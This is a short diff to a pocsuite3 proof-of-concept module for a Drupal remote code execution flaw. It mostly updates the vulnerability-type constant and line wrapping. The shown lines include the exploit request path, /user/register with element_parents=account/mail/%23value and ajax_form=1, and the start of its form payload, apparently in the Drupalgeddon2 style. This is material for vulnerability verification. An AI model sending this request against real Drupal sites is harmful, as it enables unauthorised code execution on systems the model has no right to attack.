@@ -4,7 +4,7 @@ https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
 for more about information, plz visit http://pocsuite.org
 """
 
-from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger
+from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE
 from pocsuite3.lib.utils import random_str
 
 
@@ -20,7 +20,7 @@ class DemoPOC(POCBase):
     appPowerLink = ''
     appName = 'Drupal'
     appVersion = ''
-    vulType = 'Romote Code Execution'
+    vulType = VUL_TYPE.CODE_EXECUTION
     desc = '''
     '''
     samples = []
@@ -30,7 +30,8 @@ class DemoPOC(POCBase):
     def _verify(self):
         result = {}
         flag = random_str(length=10)
-        url = self.url.rstrip('/') + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+        url = self.url.rstrip(
+            '/') + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
         payload = {
             'form_id': 'user_register_form',
             '_drupal_ajax': '1',
